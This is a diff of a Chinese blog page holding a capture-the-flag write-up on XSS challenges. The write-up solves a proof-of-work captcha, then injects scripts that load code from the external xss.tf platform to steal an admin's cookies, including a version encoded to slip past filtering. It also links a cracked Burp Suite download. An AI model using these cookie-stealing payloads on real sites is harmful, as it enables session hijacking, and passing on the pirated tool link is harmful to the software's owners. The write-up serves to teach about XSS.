@@ -6,12 +6,12 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="https://kkkiona.github.io">
-  <title>XSS 题目解析（上篇） | Kiona</title>
+  <title>Kiona</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="description" content="在开始解题之前先说一下什么是Proof Of Work，一会会用到。Proof Of Work 简称POW中文叫做工作量证明，简单来说就是用户需要通过计算机完成一定量的计算工作，才能获得需要的信息。可以用来防御拒绝服务攻击也可以用于电子货币。图片上简单说就是你得用计算机算出来这个验证码。图片的要求上说的很清楚了你的验证码前0-6位必须经过MD5加密后能够匹配示例字符串。那么接下来只需要写个脚本跑一">
 <meta name="keywords" content="Web Security">
 <meta property="og:type" content="article">
-<meta property="og:title" content="XSS 题目解析（上篇）">
+<meta property="og:title" content="Kiona">
 <meta property="og:url" content="https://kkkiona.github.io/2019/04/09/XSS 题目解析（上篇）/index.html">
 <meta property="og:site_name" content="Kiona">
 <meta property="og:description" content="在开始解题之前先说一下什么是Proof Of Work，一会会用到。Proof Of Work 简称POW中文叫做工作量证明，简单来说就是用户需要通过计算机完成一定量的计算工作，才能获得需要的信息。可以用来防御拒绝服务攻击也可以用于电子货币。图片上简单说就是你得用计算机算出来这个验证码。图片的要求上说的很清楚了你的验证码前0-6位必须经过MD5加密后能够匹配示例字符串。那么接下来只需要写个脚本跑一">
@@ -38,15 +38,14 @@
 <meta property="og:image" content="https://img-blog.csdnimg.cn/20190409112806526.png">
 <meta property="og:image" content="https://img-blog.csdnimg.cn/20190409112832640.png">
 <meta property="og:image" content="https://img-blog.csdnimg.cn/20190409113449125.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20190409114626412.png">
 <meta property="og:image" content="https://img-blog.csdnimg.cn/20190409115000620.png">
 <meta property="og:image" content="https://img-blog.csdnimg.cn/2019040911535037.png">
 <meta property="og:image" content="https://img-blog.csdnimg.cn/20190409115611316.png">
 <meta property="og:image" content="https://img-blog.csdnimg.cn/20190409115933536.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0MzMyNDk1,size_16,color_FFFFFF,t_70">
 <meta property="og:image" content="https://img-blog.csdnimg.cn/20190409120223157.png">
-<meta property="og:updated_time" content="2019-04-09T04:17:41.655Z">
+<meta property="og:updated_time" content="2019-04-09T06:51:23.516Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="XSS 题目解析（上篇）">
+<meta name="twitter:title" content="Kiona">
 <meta name="twitter:description" content="在开始解题之前先说一下什么是Proof Of Work，一会会用到。Proof Of Work 简称POW中文叫做工作量证明，简单来说就是用户需要通过计算机完成一定量的计算工作，才能获得需要的信息。可以用来防御拒绝服务攻击也可以用于电子货币。图片上简单说就是你得用计算机算出来这个验证码。图片的要求上说的很清楚了你的验证码前0-6位必须经过MD5加密后能够匹配示例字符串。那么接下来只需要写个脚本跑一">
 <meta name="twitter:image" content="https://img-blog.csdnimg.cn/20190409094634623.png">
   
@@ -190,21 +189,6 @@
             <article id="post-XSS 题目解析（上篇）" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
-      <header class="article-header">
-        
-  
-    <h1 class="article-title" itemprop="name">
-      XSS 题目解析（上篇）
-    </h1>
-  
-
-        
-        <a href="/2019/04/09/XSS 题目解析（上篇）/" class="archive-article-date">
-  	<time datetime="2019-04-09T04:03:33.734Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-04-09</time>
-</a>
-        
-      </header>
-    
     <div class="article-entry" itemprop="articleBody">
       
         <p>在开始解题之前先说一下什么是<strong>Proof Of Work</strong>，一会会用到。<br><img src="https://img-blog.csdnimg.cn/20190409094634623.png" alt="在这里插入图片描述"><br><strong>Proof Of Work</strong> 简称<strong>POW</strong>中文叫做工作量证明，简单来说就是用户需要通过计算机完成一定量的计算工作，才能获得需要的信息。可以用来防御拒绝服务攻击也可以用于电子货币。图片上简单说就是你得用计算机算出来这个验证码。图片的要求上说的很清楚了你的验证码前0-6位必须经过MD5加密后能够匹配示例字符串。那么接下来只需要写个脚本跑一下就可以了，官方提供了POW的工具但是我的环境没有调试成功等我试验成功了在发出来过程，这里先用自己的Python代码。</p>
@@ -216,7 +200,8 @@
 <p>现在问题变成了获取cookies。题目给出了给admin发送message的文本框，自然就想到用XSS获取cookies。</p>
 <p>先试探一下目标有没有设置过滤机制。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/201904091019554.png" alt="在这里插入图片描述"><br>发送成功，我们可以点Click me to view 看一下运行情况。<br><img src="https://img-blog.csdnimg.cn/2019040910211186.png" alt="在这里插入图片描述"><br>看来代码被原样执行了，没有做过滤处理。<br>这样获取cookies就很简单了，植入一个自己的Payload就可以了。我使用了一个免费的XSS平台。<a href="http://xss.tf" target="_blank" rel="noopener">http://xss.tf</a><br>创建一个项目使用默认模块就可以。<br><img src="https://img-blog.csdnimg.cn/20190409103543422.png" alt="在这里插入图片描述"><br>配置完成后，在使用界面可以看到使用说明，提供了很多使用方式。</p>
+<p><img src="https://img-blog.csdnimg.cn/201904091019554.png" alt="在这里插入图片描述"><br>发送成功，我们可以点Click me to view 看一下运行情况。<br><img src="https://img-blog.csdnimg.cn/2019040910211186.png" alt="在这里插入图片描述"><br>看来代码被原样执行了，没有做过滤处理。</p>
+<p>这样获取cookies就很简单了，植入一个自己的Payload就可以了。我使用了一个免费的XSS平台。<a href="http://xss.tf" target="_blank" rel="noopener">http://xss.tf</a><br>创建一个项目使用默认模块就可以。<br><img src="https://img-blog.csdnimg.cn/20190409103543422.png" alt="在这里插入图片描述"><br>配置完成后，在使用界面可以看到使用说明，提供了很多使用方式。</p>
 <p><img src="https://img-blog.csdnimg.cn/20190409103706460.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0MzMyNDk1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>我们选择直接插入script标签的方式。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;sCrIpt srC=http://xss.tf/GCu&gt;&lt;/sCRipT&gt;</span><br></pre></td></tr></table></figure>
 <p>这里的不规则大小写是为了防止过滤掉script标签，本题经测试可以无视。将代码输入message消息框并提交。<br><img src="https://img-blog.csdnimg.cn/20190409104803299.png" alt="在这里插入图片描述"><br>成功钓到了admin，展开后可以看到cookies。<br><img src="https://img-blog.csdnimg.cn/20190409104945464.png" alt="在这里插入图片描述"><br>接下来就很简单了使用<strong>Burp Suite</strong>修改cookies就可以了。我给出一个永久破解版的<strong>Burp Suite</strong>但是这个版本不是很新，最高只能使用Java 8不过不用注册机破解，已经开启了scanner功能。打开前需要先把时间设置到2017年以前，开启后在恢复时间即可。链接：<a href="https://pan.baidu.com/s/1TLFXq04xmkL4L-cDtYEo7Q" target="_blank" rel="noopener">https://pan.baidu.com/s/1TLFXq04xmkL4L-cDtYEo7Q</a>   提取码：qun1 </p>
@@ -231,10 +216,7 @@
 <p>实验<br><img src="https://img-blog.csdnimg.cn/20190409111128796.png" alt="在这里插入图片描述"><br>果然由于”被屏蔽无法构成闭合，而且被锁死的不只是”还有&lt;、&gt;没有这些字符将很难构造我们需要的代码。</p>
 <p>看来直接写入明文是不可能的了，由此我们想到使用“暗文”来绕过php的检测。我们可以通过转码的方式来绕过检测。</p>
 <p>可以通过使用Unicode编码来绕过php的检测，浏览器会自动解析Unicode编码把他转换为相应的字符。此方法需要明确提交的信息执行顺序是先经过php对提交内容进行原封不动的检测，再交给浏览器解析。</p>
-<p>使用编码工具对上面的语句进行转码。<br><img src="https://img-blog.csdnimg.cn/20190409112718557.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0MzMyNDk1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>把编码后的内容提交一下看看。<br><img src="https://img-blog.csdnimg.cn/20190409112806526.png" alt="在这里插入图片描述"><br>OK，成功执行。<br><img src="https://img-blog.csdnimg.cn/20190409112832640.png" alt="在这里插入图片描述"><br>那么接下来只需要植入Payload。对照你的XSS平台的使用说明，发现没有合适的使用方式，因为我们提交的内容在script标签里面，如果直接把我们的Payload写到script里面也不是不行但是过于庞大。也想到可不可以闭合script标签自己再重新构造标签，这个方法也是行不通的，我认为是因为在你的代码被解析之前，原本的script标签已经存在了所以不能闭合，而是会被解释成错误代码。<br><img src="https://img-blog.csdnimg.cn/20190409113449125.png" alt="在这里插入图片描述"><br>可以看到灰色的script标签并没有被解析。所以我们只能使用write()或者createElement()方法来把script写到body里面。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;;</span><br><span class="line">document.write(&quot;&lt;sCrIpt srC=http://xss.tf/Vw6&gt;&lt;/sCRipT&gt;&quot;);</span><br><span class="line">//</span><br></pre></td></tr></table></figure>
-<p>编码之后写入表单可以看到<br><img src="https://img-blog.csdnimg.cn/20190409114626412.png" alt="在这里插入图片描述"><br>script标签被加到了svg里面，无法引用外部 js。我们需要在body里面创建标签。所以使用createElement()方法。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&quot;;</span><br><span class="line">var s=document.createElement(&apos;script&apos;);</span><br><span class="line">document.body.appendChild(s);</span><br><span class="line">s.src=&quot;http://xss.tf/Vw6&quot;;</span><br><span class="line">//</span><br></pre></td></tr></table></figure>
+<p>使用编码工具对上面的语句进行转码。<br><img src="https://img-blog.csdnimg.cn/20190409112718557.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0MzMyNDk1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>把编码后的内容提交一下看看。<br><img src="https://img-blog.csdnimg.cn/20190409112806526.png" alt="在这里插入图片描述"><br>OK，成功执行。<br><img src="https://img-blog.csdnimg.cn/20190409112832640.png" alt="在这里插入图片描述"><br>那么接下来只需要植入Payload。对照你的XSS平台的使用说明，发现没有合适的使用方式，因为我们提交的内容在script标签里面，如果直接把我们的Payload写到script里面也不是不行但是过于庞大。也想到可不可以闭合script标签自己再重新构造标签，这个方法也是行不通的，我认为是因为在你的代码被解析之前，原本的script标签已经存在了所以不能闭合，而是会被解释成错误代码。<br><img src="https://img-blog.csdnimg.cn/20190409113449125.png" alt="在这里插入图片描述"><br>可以看到灰色的script标签并没有被解析。所以我们可以使用createElement()方法来把script写到body里面。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&quot;;</span><br><span class="line">var s=document.createElement(&apos;script&apos;);</span><br><span class="line">document.body.appendChild(s);</span><br><span class="line">s.src=&quot;http://xss.tf/Vw6&quot;;</span><br><span class="line">//</span><br></pre></td></tr></table></figure></p>
 <p>写入之后发现<br><img src="https://img-blog.csdnimg.cn/20190409115000620.png" alt="在这里插入图片描述"><br>OK，执行，并且你的XSS平台也收到了提示。但是这里的信息是你本地的信息，因为提交者是你自己抓的包当然也是你的，我们需要通过URL的方式让admin来执行这个脚本。</p>
 <p>回到题目页面把你<strong>编码后</strong>的代码放到示例URL后面<br><img src="https://img-blog.csdnimg.cn/2019040911535037.png" alt="在这里插入图片描述"><br>提交后发现<br><img src="https://img-blog.csdnimg.cn/20190409115611316.png" alt="在这里插入图片描述"><br>代码没了，经分析发现原来是Unicode的&amp;#阻断了传输，因为URL传输是有自己的编码的，那么我们就把代码转换成URL编码就可以了。注意是把Unicode编码好的再转一次转成encodeURIComponent编码。<br><img src="https://img-blog.csdnimg.cn/20190409115933536.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0MzMyNDk1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>提交编码。<br><img src="https://img-blog.csdnimg.cn/20190409120223157.png" alt="在这里插入图片描述"><br>flag在cookies里面。</p>
 
